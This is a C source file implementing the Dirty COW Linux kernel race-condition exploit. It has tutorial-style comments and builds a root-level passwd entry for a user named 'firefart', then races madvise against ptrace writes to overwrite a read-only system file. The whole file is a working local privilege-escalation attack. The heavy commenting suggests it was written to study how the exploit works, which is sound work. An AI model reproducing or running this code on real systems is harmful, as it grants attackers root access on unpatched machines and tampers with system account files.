#include "main.h"
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <crypt.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>

int fileDescriptor; // file descriptor
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

char *generatePasswordHash(char *password) {
  return crypt(password, PASSWORD_SALT);
}

char *generatePasswordLine(struct UserInformation user) {
  // How does `snprintf` works
  // int snprintf(char *str, int size, const char *format, ...);
  //  - *str is the buffer where printf output will be redirected to
  //  - size is the maximum number of bytes that will be written to the buffer.
  //  - The format and the optional ... arguments are just the string formats
  //  - like "%d", myint as seen in printf.
  //
  // `snprintf` returns the size of the format string after substitution
  int size = snprintf(
    NULL,
    0,
    PASSWORD_LINE_FORMAT,
    user.username,
    user.hash,
    user.user_id,
    user.group_id,
    user.info,
    user.home_dir,
    user.shell
  );

  // Allocating memory and returning pointer to it
  char *passwordLinePtr = malloc(size + STRING_ENDING_CHARACTER_SIZE);

  // If memory wasn't allocated
  // Throw error and exit
  if (passwordLinePtr == NULL) {
    fprintf(stderr, "Coudn't allocate memory for the password line");
    exit(MEMORY_ALLOCATE_FAILURE_CODE);
  }

  // How does `sprintf` works
  // int sprintf(char *str, const char *format, ...)
  //  - *str is the buffer where printf output will be redirected to
  //  - The format and the optional ... arguments are just the string formats
  //  - like "%d", myint as seen in printf.
  //
  // `sprintf` function sends formatted output to a string pointed to, by str.
  sprintf(
    passwordLinePtr,
    PASSWORD_LINE_FORMAT,
    user.username,
    user.hash,
    user.user_id,
    user.group_id,
    user.info,
    user.home_dir,
    user.shell
  );

  return passwordLinePtr;
}

void *madviseThread(void *arg) {
  int i, c = 0;

  for (i = 0; i < MADVISE_THREAD_ITERATION_COUNT; i++) {
    // You have to race madvise(MADV_DONTNEED) ::
    // https://access.redhat.com/security/vulnerabilities/2706661 > This is
    // achieved by racing the madvise(MADV_DONTNEED) system call > while having
    // the page of the executable mmapped in memory.
    //
    // race condition

    // The madvise() system call is used to give advice or directions to the
    // kernel about the address range beginning at address addr and with
    // size length bytes In most cases, the goal of such advice is to
    // improve system or application performance.
    c += madvise(map, MADVISE_THREAD_SIZE, MADV_DONTNEED);
  }

  // On success, madvise() returns zero.
  // On error, it returns -1 and errno is set appropriately.
  // So here we are printing sum of the errors
  printf("madvise %d\n\n", c);
}

// file path which to backup('/etc/big_shaq/mans_not_hot')
// file path where to backup('/etc/big_shaq/mans_not_hot_COPY')
int createBackupFile(const char *sourceFileNamePath,
                     const char *targetFileNamePath) {
  // We need to make sure that file to which we are going to copy content
  // doesn't exist
  // check if target file already exists
  if (access(targetFileNamePath, F_OK) == FILE_IS_PRESENT_CODE) {
    printf("File %s already exists! Please delete it and run again\n", targetFileNamePath);
    return CREATE_BACKUP_FILE_FAILURE_CODE;
  }

  FILE *source; // Source file from which to read content
  FILE *target; // Source file where to write content

  // Opening source file with `read` permission
  source = fopen(sourceFileNamePath, FILE_READ);

  // If we coudn't open the source file
  // Return failure status code
  if (source == NULL) {
    return CREATE_BACKUP_FILE_FAILURE_CODE;
  }

  // Opening source file with `write` permission
  target = fopen(targetFileNamePath, FILE_WRITE);

  // If we coudn't open the target file
  // Return failure status code
  if (target == NULL) {
    fclose(source);
    return CREATE_BACKUP_FILE_FAILURE_CODE;
  }

  char ch;

  // Reading content of the source file
  while((ch = fgetc(source)) != EOF) {
    // If we haven't yet reached the end of the file
    // Write readet character into the target file
    fputc(ch, target);
  }

  printf("%s successfully backed up to %s\n", sourceFileNamePath, targetFileNamePath);

  // Closing source and target files after we have finished copying operation
  fclose(source);
  fclose(target);

  return CREATE_BACKUP_FILE_SUCCESS_CODE;
}

int main(int argc, char *argv[]) {
  // Copying content of the file into the backup file
  int createBackupStatus = createBackupFile(SOURCE_FILE_NAME_PATH, BACKUP_FILE_NAME_PATH);

  // If it didn't succeed -> exit with failure code
  if (createBackupStatus != CREATE_BACKUP_FILE_SUCCESS_CODE) {
    exit(CREATE_BACKUP_FILE_FAILURE_CODE);
  }

  // Creating fake user with information about his machine
  struct UserInformation user;

  // Setting user information values
  user.username = "firefart";
  user.user_id = 0;
  user.group_id = 0;
  user.info = "pwned";
  user.home_dir = "/root";
  user.shell = "/bin/bash";

  char *typedPassword;

  // If number of the arguments is more than or equal to 2
  if (argc >= 2) {
    typedPassword = argv[1];
    printf("Congrats! Your password is: %s\n", typedPassword);
  } else {
    typedPassword = getpass("Please enter the new password: ");
  }

  user.hash = generatePasswordHash(typedPassword);

  char *generatedPasswordLine = generatePasswordLine(user);

  printf("Congrats! Your genereated password line is: %s\n", generatedPasswordLine);

  fileDescriptor = open(SOURCE_FILE_NAME_PATH, O_RDONLY);
  fstat(fileDescriptor, &st);

  // `mmap` is used to create a new mapped memory segment in the current process
  map = mmap(
    NULL,
    st.st_size + sizeof(long),
    PROT_READ,      // read only
    MAP_PRIVATE,    // COPY_ON_WRITE mode
    fileDescriptor, // file path
    0
  );

  printf("mmap: %lx\n", (unsigned long)map);

  pid = fork();

  if (pid) {
    // Wait for process to change state
    // arguments:
    //  - 1: pid ID
    //  - 2: status
    //  - 3: options
    waitpid(pid, NULL, 0);

    int u, i, o, c = 0;
    int generatedPasswordLineLength = strlen(generatedPasswordLine);

    for (i = 0; i < 10000 / generatedPasswordLineLength; i++) {
      for (o = 0; o < generatedPasswordLineLength; o++) {
        for (u = 0; u < 10000; u++) {
          c += ptrace(
            PTRACE_POKETEXT,
            pid,
            map + o,
            *((long *)(generatedPasswordLine + o))
          );
        }
      }
    }
    printf("ptrace %d\n", c);
  } else {
    pthread_create(&pth, NULL, madviseThread, NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth, NULL);
  }

  // Printing Messages Section
  // Printing `done` message
  printf(
    "Done! Check %s to see if the new user was created.\n",
    SOURCE_FILE_NAME_PATH
  );

  // Printing information about new ability to log in into the root
  printf(
    "You can log in with the username '%s' and the password '%s'.\n\n",
    user.username,
    typedPassword
  );

  // Printing restore passwords helper
  printf(
    "\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
    BACKUP_FILE_NAME_PATH,
    SOURCE_FILE_NAME_PATH
  );

  return 0;
}
